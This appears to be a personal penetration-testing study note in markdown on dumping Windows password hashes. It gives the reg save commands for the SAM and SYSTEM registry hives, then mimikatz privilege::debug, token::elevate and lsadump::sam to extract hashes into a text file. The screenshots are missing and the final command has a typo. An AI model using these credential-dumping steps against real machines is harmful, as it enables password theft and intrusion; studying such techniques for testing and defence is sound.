




# **SYSTEM** and **SAM** Registry Hives




1. We can extract the **SYSTEM** and **SAM** **Registry Hives** from a local Windows machine by using the following command : 


>[!code]
>
>#### Command : 
>
>This would take care of the **SAM Registry** : 
>
>		reg save HKLM\SAM SamBkup.hiv
>
>
>#### Command :  
>
>This would take care of the **SYSTEM Registry** :
>
>		reg save HKLM\SYSTEM SystemBkup.hiv
>





# Dumping the **Hashes** with *MiMiKatZ* and *LSADump*



We would launch **MiMiKaTz** wit the following command : 


>[!code]
>
>#### Command : 
>
>	mimikatz 
>
>Which yields a shell : 
>
>	mimikatz# 
>
>We would need to run the following command , but without *administrative privileges*, we would get an error such as the following : 
>
>#### Command : 
>
>	lsadump::sam SystemBkup.hiv SamBkup.hiv
>
>###### Error : 
>![[Pasted image 20240327180553.png]]
>
>
>
>The reason why this command does not work is due to lack of *administrative privileges*. The way to get around it is via the following commands : 
>
>#### Command : 
>
>	privilege::debug
>
>#### Second Command :
>
>	token::elevate
>
>Next, we use the *log* command so the next command will output to a *txt* file : 
>
>#### Command : 
>
>	log hash.txt
>
>After doing so, we issue the command we tried earlier on : 
>
>#### Command : 
>
>	lsadump::sam SystemBkup.hiv SamBkup.hivc
>
>This would lead to the much-welcomed result : 
>
>![[Pasted image 20240327181458.png]]
>
>Next, let us check out the *hash.txt* file : 
>
>
>





